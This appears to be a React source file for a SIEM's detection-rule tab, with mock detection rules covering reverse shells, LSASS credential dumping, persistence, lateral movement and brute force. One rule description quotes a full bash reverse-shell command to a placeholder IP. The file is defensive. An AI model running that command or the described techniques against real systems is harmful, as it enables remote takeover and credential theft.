import {
  ConstructionOutlined as ConstructionIcon,
  Rule as RuleIcon,
} from '@mui/icons-material';
import {
  Box,
  Chip,
  Stack,
  Typography,
} from '@mui/material';
import React, { useCallback, useState } from 'react';
import { useTranslation } from '../../../hooks/useTranslation';
import { DetectionRuleDetail, type DetectionRuleData } from '../components/DetectionRuleDetail';
import { DetectionRuleList, type DetectionRuleListItem } from '../components/DetectionRuleList';

// ── 목업 데이터 ──────────────────────────────────────────────────────────────

const MOCK_RULES: DetectionRuleData[] = [
  {
    id: 'rule-8f1a9c',
    name: 'Linux Reverse Shell 탐지',
    logType: 'Linux System Logs',
    description: "bash가 외부 IP로 연결을 시도하는 행위를 탐지합니다. 공격자가 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1' 같은 명령으로 리버스 셸을 생성할 때 주로 발견됩니다.",
    lastUpdated: '2026-02-18T09:30:00.000Z',
    author: '김장훈 (CRUX SIEM)',
    source: 'Standard',
    license: 'Detection Rule License (DRL)',
    severity: 'critical',
    tags: ['attack.execution', 'attack.t1059.004'],
    references: [
      'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md',
    ],
    falsePositives: ['알려진 오탐 사례 없음'],
    ruleStatus: 'stable',
    enabled: true,
    detection: `selection:
  Image|endswith: /bin/bash
filter:
  DestinationIp:
    - 127.0.0.1
    - 0.0.0.0
condition: selection and not filter`,
  },
  {
    id: 'rule-3b7e2d',
    name: 'PowerShell 인코딩 명령 실행',
    logType: 'Windows Process Events',
    description: 'PowerShell이 Base64 인코딩된 명령줄 인수로 실행되는 것을 탐지합니다. 공격자가 탐지를 회피하기 위해 난독화 기법을 사용하는 경우 주로 나타납니다.',
    lastUpdated: '2026-01-15T14:00:00.000Z',
    author: '김장훈 (CRUX SIEM)',
    source: 'Standard',
    license: 'Detection Rule License (DRL)',
    severity: 'critical',
    tags: ['attack.execution', 'attack.t1059.001', 'attack.defense_evasion', 'attack.t1027'],
    references: [
      'https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe',
    ],
    falsePositives: ['관리자가 자동화 스크립트에서 인코딩 옵션을 사용하는 경우'],
    ruleStatus: 'stable',
    enabled: true,
    detection: `selection:
  CommandLine|contains:
    - '-enc '
    - '-EncodedCommand '
    - '-e '
  Image|endswith: \\powershell.exe
condition: selection`,
  },
  {
    id: 'rule-a4c510',
    name: 'LSASS 메모리 접근을 통한 자격증명 덤프',
    logType: 'Windows Sysmon Logs',
    description: 'LSASS 프로세스 메모리에 대한 접근을 탐지합니다. Mimikatz 등 자격증명 탈취 공격에서 흔히 사용되는 기법이며, 도메인 관리자 계정 탈취로 이어질 수 있습니다.',
    lastUpdated: '2026-03-01T11:00:00.000Z',
    author: '박서준 (보안관제팀)',
    source: 'Community',
    license: 'Detection Rule License (DRL)',
    severity: 'critical',
    tags: ['attack.credential_access', 'attack.t1003.001'],
    references: [
      'https://attack.mitre.org/techniques/T1003/001/',
      'https://github.com/gentilkiwi/mimikatz',
    ],
    falsePositives: ['정상적인 보안 솔루션(AV/EDR)이 LSASS를 검사하는 경우', 'Windows Defender 정기 검사'],
    ruleStatus: 'stable',
    enabled: true,
    detection: `selection:
  TargetImage|endswith: \\lsass.exe
  GrantedAccess|contains:
    - '0x1010'
    - '0x1038'
filter:
  SourceImage|endswith:
    - \\wmiprvse.exe
    - \\taskmgr.exe
condition: selection and not filter`,
  },
  {
    id: 'rule-d62f8b',
    name: '레지스트리 Run Key 지속성 확보',
    logType: 'Windows Registry Events',
    description: 'HKCU/HKLM의 Run 및 RunOnce 레지스트리 키 수정을 탐지합니다. 사용자 로그인 시 자동 실행되는 악성코드를 심기 위해 공격자가 흔히 사용하는 지속성 확보 기법입니다.',
    lastUpdated: '2025-11-20T16:00:00.000Z',
    author: '이도현 (위협분석팀)',
    source: 'Standard',
    license: 'Detection Rule License (DRL)',
    severity: 'medium',
    tags: ['attack.persistence', 'attack.t1547.001'],
    references: ['https://attack.mitre.org/techniques/T1547/001/'],
    falsePositives: ['정상적인 소프트웨어 설치 과정(msiexec 등)', '시스템 관리 도구의 자동 실행 등록'],
    ruleStatus: 'stable',
    enabled: true,
    detection: `selection:
  TargetObject|contains:
    - \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
    - \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce
  EventType: SetValue
filter:
  Image|endswith:
    - \\msiexec.exe
    - \\software_reporter_tool.exe
condition: selection and not filter`,
  },
  {
    id: 'rule-71ea43',
    name: 'PsExec을 이용한 횡적 이동',
    logType: 'Windows Process Events',
    description: 'PsExec 또는 유사 도구를 사용하여 원격 시스템에서 명령을 실행하는 횡적 이동 행위를 탐지합니다. 내부망 장악 단계에서 자주 관측됩니다.',
    lastUpdated: '2026-01-28T10:15:00.000Z',
    author: '김장훈 (CRUX SIEM)',
    source: 'Standard',
    license: 'Detection Rule License (DRL)',
    severity: 'high',
    tags: ['attack.lateral_movement', 'attack.t1570', 'attack.t1021.002'],
    references: [
      'https://attack.mitre.org/techniques/T1570/',
      'https://docs.microsoft.com/en-us/sysinternals/downloads/psexec',
    ],
    falsePositives: ['IT 관리자가 원격 관리 목적으로 PsExec을 정당하게 사용하는 경우'],
    ruleStatus: 'stable',
    enabled: true,
    detection: `selection_service:
  PipeName: \\PSEXESVC
selection_process:
  Image|endswith: \\PSEXESVC.exe
  ParentImage|endswith: \\services.exe
condition: selection_service or selection_process`,
  },
  {
    id: 'rule-5cf902',
    name: 'DNS over HTTPS 우회 통신 탐지',
    logType: 'Network Firewall Logs',
    description: '알려진 공개 DoH 제공자로의 DNS-over-HTTPS 연결을 탐지합니다. 공격자가 DNS 모니터링을 우회하여 C2 서버와 통신하거나 데이터를 유출할 때 사용될 수 있습니다.',
    lastUpdated: '2026-02-05T17:30:00.000Z',
    author: '최윤서 (네트워크보안팀)',
    source: 'Community',
    license: 'Detection Rule License (DRL)',
    severity: 'medium',
    tags: ['attack.command_and_control', 'attack.t1071.001', 'attack.t1573'],
    references: [
      'https://attack.mitre.org/techniques/T1071/001/',
    ],
    falsePositives: ['브라우저(Chrome, Firefox 등)의 DoH 기본 설정이 활성화된 경우', 'OS 레벨 DNS 보안 설정'],
    ruleStatus: 'test',
    enabled: false,
    detection: `selection:
  DestinationPort: 443
  DestinationHostname|endswith:
    - dns.google
    - cloudflare-dns.com
    - dns.quad9.net
    - doh.opendns.com
condition: selection`,
  },
  {
    id: 'rule-e89b17',
    name: 'CLI를 통한 예약 작업 생성',
    logType: 'Windows Process Events',
    description: 'schtasks.exe를 통해 예약 작업이 생성되는 것을 탐지합니다. 공격자가 지속성 확보 또는 권한 상승을 위해 악성 예약 작업을 등록할 때 사용됩니다.',
    lastUpdated: '2026-03-10T08:45:00.000Z',
    author: '박서준 (보안관제팀)',
    source: 'Standard',
    license: 'Detection Rule License (DRL)',
    severity: 'high',
    tags: ['attack.persistence', 'attack.execution', 'attack.t1053.005'],
    references: ['https://attack.mitre.org/techniques/T1053/005/'],
    falsePositives: ['시스템 관리자의 정상적인 예약 작업 등록', '소프트웨어 설치 스크립트의 자동 등록'],
    ruleStatus: 'stable',
    enabled: true,
    detection: `selection:
  Image|endswith: \\schtasks.exe
  CommandLine|contains: /create
filter:
  User|contains: SYSTEM
  ParentImage|endswith:
    - \\setup.exe
    - \\msiexec.exe
condition: selection and not filter`,
  },
  {
    id: 'rule-2af4d6',
    name: 'SSH 무차별 대입 공격 탐지',
    logType: 'Linux Auth Logs',
    description: '동일 IP에서 짧은 시간 내 다수의 SSH 로그인 실패가 발생하는 것을 탐지합니다. 자동화된 브루트포스 공격의 전형적인 패턴이며, 성공 시 서버 장악으로 이어집니다.',
    lastUpdated: '2026-02-25T13:00:00.000Z',
    author: '이도현 (위협분석팀)',
    source: 'Community',
    license: 'Detection Rule License (DRL)',
    severity: 'high',
    tags: ['attack.credential_access', 'attack.t1110.001'],
    references: ['https://attack.mitre.org/techniques/T1110/001/'],
    falsePositives: ['자동화 배포 도구의 SSH 키 설정 오류', '사용자의 반복적인 비밀번호 입력 실패'],
    ruleStatus: 'test',
    enabled: false,
    detection: `selection:
  service: sshd
  action: failed
timeframe: 5m
condition: selection | count(source_ip) > 10`,
  },
];

const toListItems = (rules: DetectionRuleData[]): DetectionRuleListItem[] =>
  rules.map(({ id, name, severity, logType, tags, enabled }) => ({ id, name, severity, logType, tags, enabled }));

// ── 메인 컴포넌트 ─────────────────────────────────────────────────────────────

const DetectionRuleTab: React.FC = () => {
  const { t } = useTranslation();
  const [selectedRuleId, setSelectedRuleId] = useState<string | null>(null);
  const [rules, setRules] = useState(MOCK_RULES);

  const handleToggleEnabled = useCallback((ruleId: string) => {
    setRules((prev) => prev.map((r) => r.id === ruleId ? { ...r, enabled: !r.enabled } : r));
  }, []);

  const [listWidth, setListWidth] = useState(320);
  const isResizing = React.useRef(false);

  const handleMouseDown = useCallback(() => {
    isResizing.current = true;
    document.body.style.cursor = 'col-resize';
    document.body.style.userSelect = 'none';

    const handleMouseMove = (e: MouseEvent) => {
      if (!isResizing.current) return;
      const containerLeft = document.getElementById('detection-master-detail')?.getBoundingClientRect().left ?? 0;
      const newWidth = e.clientX - containerLeft;
      setListWidth(Math.max(200, Math.min(600, newWidth)));
    };

    const handleMouseUp = () => {
      isResizing.current = false;
      document.body.style.cursor = '';
      document.body.style.userSelect = '';
      document.removeEventListener('mousemove', handleMouseMove);
      document.removeEventListener('mouseup', handleMouseUp);
    };

    document.addEventListener('mousemove', handleMouseMove);
    document.addEventListener('mouseup', handleMouseUp);
  }, []);

  const selectedRule = rules.find((r) => r.id === selectedRuleId) ?? null;

  return (
    <Box sx={{ flex: '1 1 0', display: 'flex', flexDirection: 'column', height: '100%', maxHeight: '100%', bgcolor: 'background.default', overflow: 'hidden', p: { xs: 1.5, sm: 2, md: 3 }, minHeight: 0, position: 'relative' }}>

      {/* 상단 타이틀 바 */}
      <Box sx={{ flexShrink: 0, display: 'flex', alignItems: 'center', justifyContent: 'space-between', mb: 1.5 }}>
        <Stack direction="row" alignItems="center" spacing={1}>
          <RuleIcon sx={{ fontSize: 20, color: 'primary.main' }} />
          <Typography variant="h6" sx={{ fontWeight: 'bold', fontSize: '1.1rem' }}>
            {t('detectionRules')}
          </Typography>
          <Chip label={t('heartbeatBeta')} size="small" variant="outlined" color="warning" icon={<ConstructionIcon />}
            sx={{ fontSize: '0.6rem', height: 22 }} />
        </Stack>
      </Box>

      {/* 마스터-디테일 레이아웃 */}
      <Box id="detection-master-detail" sx={{ flex: '1 1 0', display: 'flex', minHeight: 0, overflow: 'hidden' }}>
        <DetectionRuleList
          width={listWidth}
          rules={toListItems(rules)}
          selectedRuleId={selectedRuleId}
          onSelect={setSelectedRuleId}
          onToggleEnabled={handleToggleEnabled}
          loading={false}
          t={t}
        />

        {/* 리사이즈 핸들 */}
        <Box
          onMouseDown={handleMouseDown}
          sx={{
            width: 10,
            flexShrink: 0,
            cursor: 'col-resize',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            '&:hover > div, &:active > div': { bgcolor: 'primary.main' },
          }}
        >
          <Box sx={{ width: 2, height: 40, borderRadius: 1, bgcolor: 'divider', transition: 'background-color 0.2s' }} />
        </Box>

        <DetectionRuleDetail
          rule={selectedRule}
          t={t}
        />
      </Box>
    </Box>
  );
};

export default DetectionRuleTab;
